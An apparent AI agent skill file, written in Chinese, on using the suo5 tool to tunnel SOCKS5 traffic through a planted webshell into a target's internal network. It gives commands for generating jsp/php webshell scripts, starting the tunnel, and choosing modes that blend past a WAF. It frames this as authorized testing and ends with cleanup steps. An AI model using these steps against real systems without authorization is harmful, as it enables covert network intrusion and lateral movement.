---
name: as-suo5-tunnel
description: 使用 suo5 搭建基于单个 HTTP 请求的 SOCKS5 隧道。当目标仅有一个可控的 web 入口（可控 URL/路由）、需要在 HTTP 层面建立全双工 SOCKS5 代理、或被控端只有 webshell 而无法执行二进制时使用。
---

# suo5 HTTP 全双工隧道

suo5 在单个 HTTP(S) 连接上建立全双工 SOCKS5 隧道，攻击端把请求发往被控端的一个可控 HTTP 入口（webshell、可控路由），由该入口把流量转进内网。项目地址：https://github.com/zema1/suo5

## 核心概念

- **入口端**：一个可控的 HTTP 处理点——webshell（suo5 生成对应服务端脚本）、可控 web 框架路由、或 SSRF 通道
- **客户端**（suo5 CLI）：从攻击机连向入口，协商出全双工通道并暴露 SOCKS5
- 传输模式：auto（自动选择 chunked/raw/.websocket）、raw（最稳）、websocket（兼容性最好）

## 基础用法

### 生成入口脚本

```bash
# 按 webshell 类型生成
suo5 gen -t jsp -o agent.jsp
# 支持 jsp/jspx/php/asp/aspx/.net 等
```

把生成的脚本放到可控的 web 路径（评估授权范围内的服务器）。

### 启动隧道

```bash
suo5 -t https://target.example.invalid/agent.jsp -l 127.0.0.1:1080
# 攻击机 1080 即为进入目标内网的 SOCKS5
```

### 参数要点

```bash
# 强制 raw 模式（目标网络环境对 chunked 不友好时）
suo5 -t URL -l 1080 --mode raw

# 带认证的入口（生成时写入凭据）
suo5 gen -t php --user u --pass p -o agent.php

# 带宽探测
suo5 -t URL -l 1080 --buff-size 32768
```

## 场景匹配

| 场景 | 适配点 |
|------|--------|
| 目标只有 webshell，无二进制执行 | 入口就是 webshell 文件 |
| 边界 WAF 拦截非常见流量 | websocket/auto 模式混入正常 HTTP |
| 需要内网横向的稳定代理 | SOCKS5 + proxychains/nuclei 的 -proxy |
| HTTPS 入口 | `-t https://...` 直连即可 |

## 排错与收尾

- 连不上：先 curl 确认入口 URL 可达且返回非错误页
- 速度慢：`--mode raw` 通常最快；chunked 需要中间层不缓冲
- 收尾必删：任务结束删除入口脚本并确认 404，不留可复用入口
